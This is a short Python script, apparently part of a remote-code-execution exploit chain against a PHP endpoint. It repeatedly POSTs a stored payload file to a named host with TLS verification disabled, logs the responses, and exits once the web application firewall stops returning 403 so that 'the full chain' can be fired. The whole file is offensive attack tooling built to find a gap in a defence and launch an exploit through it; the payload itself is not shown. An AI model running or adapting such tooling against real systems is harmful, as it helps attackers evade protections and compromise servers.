#!/usr/bin/env python3
"""WAF window watcher: light A1 probe every 10 min. Exits 0 the moment the
A1 is no longer 403 (the window opened) so the chain can fire."""
import socket
import ssl
import sys
import time

HOST = "php-rce.cloudflare.app"
BODY = open("a1_stock_default.bin", "rb").read()
ROUNDS = int(sys.argv[1]) if len(sys.argv) > 1 else 18


def probe():
    s = socket.create_connection((HOST, 443), timeout=30)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    s = ctx.wrap_socket(s, server_hostname=HOST)
    s.settimeout(90)
    s.sendall(b"POST /php/index.php HTTP/1.1\r\nHost: " + HOST.encode() +
              b"\r\nContent-Type: multipart/form-data; boundary=CCCCCCCCCC\r\n"
              b"Content-Length: " + str(len(BODY)).encode() +
              b"\r\nConnection: close\r\n\r\n")
    s.sendall(BODY)
    resp = b""
    while True:
        try:
            c = s.recv(65536)
        except Exception:
            break
        if not c:
            break
        resp += c
    s.close()
    return resp


for i in range(ROUNDS):
    try:
        resp = probe()
        st = resp.split(b"\r\n", 1)[0]
        open(f"watch_{i:02d}.resp", "wb").write(resp)
        blocked = b"403" in st
        oom = b"tried to allocate" in resp
        print(f"{time.strftime('%H:%M:%S')} probe {i:02d}: {st!r} "
              f"resp={len(resp)} oom_in_band={oom}", flush=True)
        if not blocked:
            print("[+] WINDOW OPEN - fire the full chain now", flush=True)
            sys.exit(0)
    except Exception as e:
        print(f"{time.strftime('%H:%M:%S')} probe {i:02d}: EXC {e!r}",
              flush=True)
    time.sleep(600)
print("[-] window still closed after all rounds", flush=True)
sys.exit(1)
